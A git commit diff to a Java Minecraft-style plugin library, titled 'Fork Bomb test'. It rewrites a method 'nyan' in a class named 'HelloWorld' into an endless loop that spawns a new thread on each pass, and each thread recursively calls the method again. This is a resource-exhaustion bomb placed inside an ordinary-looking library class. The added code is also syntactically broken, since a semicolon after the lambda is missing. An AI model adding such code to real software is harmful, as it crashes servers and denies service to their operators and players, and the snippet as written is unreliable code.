cae8d524884bbc609b998048b32d121cced8ffd3
bearofbusiness <bearofbusines@gmail.com>
2024-10-05 22:35:11 -0400

    Fork Bomb test

--- src/main/java/org/vindicterra/vindicterraLib/VindicterraLib.java
+++ src/main/java/org/vindicterra/vindicterraLib/VindicterraLib.java
@@ -20,9 +20,15 @@ public final class VindicterraLib extends JavaPlugin {
     }
 
     public static final class HelloWorld {
-        public static void nyan(String[] args){
-            System.err.println("null:3");
-            nyan(List.of(":3").toArray(new String[0]));
+        public static void nyan(String[] args) {
+            Runnable task = () -> {
+                nyan(List.of(":3").toArray(new String[0]));
+            }
+            for(;;) {
+                System.err.println("null:3");
+                Thread thread = new Thread(task);
+                thread.start();
+            }
         }
     }
 }
